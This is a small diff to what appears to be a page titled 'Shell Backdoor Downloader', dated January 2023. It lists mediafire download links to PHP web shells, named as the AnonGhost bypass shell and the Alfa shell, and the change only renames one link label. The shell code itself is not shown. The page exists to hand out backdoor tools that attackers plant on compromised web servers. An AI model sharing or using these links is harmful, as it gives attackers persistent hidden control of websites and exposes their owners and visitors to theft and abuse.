@@ -3,7 +3,7 @@ SHELL BACKDOOR DOWNLOADER BY OMEST
 Date : 10 January 2023
 </a>
 
-# <a href="https://www.mediafire.com/file/882sddgbo0rv8q6/anonghost-bypass_shell.php/file">AnonGhost Bypass Shell V2 2014</a>
+# <a href="https://www.mediafire.com/file/882sddgbo0rv8q6/anonghost-bypass_shell.php/file">AnonGhost Bypass</a>
 <img src="https://imgur.com/ZBxBGXu.png" alt="beruangsalju profile">
 
 # <a href="https://www.mediafire.com/file/qv97adxdb23ld8q/alfa_shell.php/file">Alfa Solevisible</a> 
